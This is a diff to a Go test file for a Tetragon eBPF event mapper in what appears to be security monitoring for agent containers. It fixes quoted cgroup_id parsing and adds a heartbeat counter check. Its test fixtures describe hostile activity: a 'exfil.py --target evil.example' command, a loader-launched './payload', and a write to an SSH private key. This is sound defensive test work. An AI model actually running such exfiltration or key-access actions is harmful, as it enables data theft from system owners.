@@ -119,7 +119,7 @@ func TestMapProcessExec(t *testing.T) {
 				"binary": "/usr/bin/python3",
 				"arguments": "exfil.py --target evil.example",
 				"docker": "abc123def456",
-				"cgroup_id": 987654,
+				"cgroup_id": "987654",
 				"pod": null
 			},
 			"parent": {"binary": "/bin/bash"}
@@ -185,7 +185,7 @@ func TestMapProcessExec_LoaderFlag(t *testing.T) {
 				"binary": "/lib64/ld-linux-x86-64.so.2",
 				"arguments": "./payload",
 				"docker": "abc123def456",
-				"cgroup_id": 987654
+				"cgroup_id": "987654"
 			}
 		}
 	}`)
@@ -225,6 +225,34 @@ func TestMapProcessExec_LoaderInArgv(t *testing.T) {
 	}
 }
 
+// TestMapProcessExec_CgroupIDQuotedString locks down FINDING U041: Tetragon's
+// protojson export renders proto uint64 fields (cgroup_id) as JSON STRINGS,
+// e.g. "cgroup_id":"987654", never a bare number. Before CgroupID's tag
+// carried ,string, json.Unmarshal returned an UnmarshalTypeError on that one
+// field and MapLine dropped the ENTIRE line (types.AuditEvent{}, false) —
+// silently blinding every real exec/kprobe event with a nonzero cgroup id, not
+// merely losing the cgroup id itself.
+func TestMapProcessExec_CgroupIDQuotedString(t *testing.T) {
+	m := NewMapper(mappedCorrelator())
+	// Real Tetragon protojson output quotes 64-bit integer fields.
+	line := []byte(`{
+		"process_exec": {
+			"process": {
+				"binary": "/usr/bin/python3",
+				"docker": "abc123def456",
+				"cgroup_id": "987654"
+			}
+		}
+	}`)
+	ev, ok := m.MapLine(line)
+	if !ok {
+		t.Fatal("expected exec with protojson-shaped (quoted) cgroup_id to map, not be silently dropped")
+	}
+	if d := decodeData(t, ev); d.CgroupID != knownCgroup {
+		t.Errorf("cgroup_id = %d, want %d", d.CgroupID, knownCgroup)
+	}
+}
+
 // TestMapNetworkConnect covers the DOCUMENTED Tetragon export shape for a TCP
 // connect. Tetragon has NO top-level "process_connect" event kind (the
 // GetEventsResponse oneof is process_exec / process_exit / process_kprobe /
@@ -239,7 +267,7 @@ func TestMapNetworkConnect(t *testing.T) {
 	// Ordinary outbound connect (public IP) via a tcp_connect kprobe.
 	line := []byte(`{
 		"process_kprobe": {
-			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456", "cgroup_id": 987654},
+			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456", "cgroup_id": "987654"},
 			"function_name": "tcp_connect",
 			"args": [{"sock_arg": {"family": "AF_INET", "protocol": "IPPROTO_TCP", "saddr": "172.17.0.2", "daddr": "93.184.216.34", "sport": 51000, "dport": 443}}]
 		}
@@ -345,7 +373,7 @@ func TestMapFileWrite_Sensitive(t *testing.T) {
 	// A write to ~/.ssh via a security_file_permission kprobe.
 	line := []byte(`{
 		"process_kprobe": {
-			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456", "cgroup_id": 987654},
+			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456", "cgroup_id": "987654"},
 			"function_name": "security_file_permission",
 			"args": [{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}]
 		}
@@ -414,7 +442,7 @@ func TestMapUnmapped_RunIDNull(t *testing.T) {
 	m := NewMapper(mappedCorrelator())
 	line := []byte(`{
 		"process_exec": {
-			"process": {"binary": "/usr/bin/wget", "docker": "UNKNOWNcontainer", "cgroup_id": 555}
+			"process": {"binary": "/usr/bin/wget", "docker": "UNKNOWNcontainer", "cgroup_id": "555"}
 		}
 	}`)
 	ev, ok := m.MapLine(line)
@@ -451,7 +479,7 @@ func TestMapUnmapped_CgroupOnlyNoLongerCorrelates(t *testing.T) {
 	// under the removed cgroup-fallback index.
 	m := NewMapper(mappedCorrelator())
 	line := []byte(`{
-		"process_exec": {"process": {"binary": "/bin/sh", "cgroup_id": 987654}}
+		"process_exec": {"process": {"binary": "/bin/sh", "cgroup_id": "987654"}}
 	}`)
 	ev, ok := m.MapLine(line)
 	if !ok {
@@ -482,7 +510,7 @@ func TestMapUnknownKind(t *testing.T) {
 }
 
 func TestHeartbeatEventWithDropped(t *testing.T) {
-	ev := HeartbeatEventWithDropped(0)
+	ev := HeartbeatEventWithDropped(3, 7)
 	if ev.Action != ActionSensorHeartbeat {
 		t.Errorf("action = %q, want %q", ev.Action, ActionSensorHeartbeat)
 	}
@@ -498,6 +526,22 @@ func TestHeartbeatEventWithDropped(t *testing.T) {
 	d := decodeData(t, ev)
 	if d.Stream != Stream {
 		t.Errorf("stream = %q, want ebpf", d.Stream)
+	}
+	// dropped_total and observed_total must be carried on the heartbeat data so
+	// /healthz can tell a blind sensor (observed==0) apart from one where events
+	// flow.
+	var hb struct {
+		DroppedTotal  uint64 `json:"dropped_total"`
+		ObservedTotal uint64 `json:"observed_total"`
+	}
+	if err := json.Unmarshal(ev.Data, &hb); err != nil {
+		t.Fatalf("decode heartbeat data: %v", err)
+	}
+	if hb.DroppedTotal != 3 {
+		t.Errorf("dropped_total = %d, want 3", hb.DroppedTotal)
+	}
+	if hb.ObservedTotal != 7 {
+		t.Errorf("observed_total = %d, want 7", hb.ObservedTotal)
 	}
 }
 
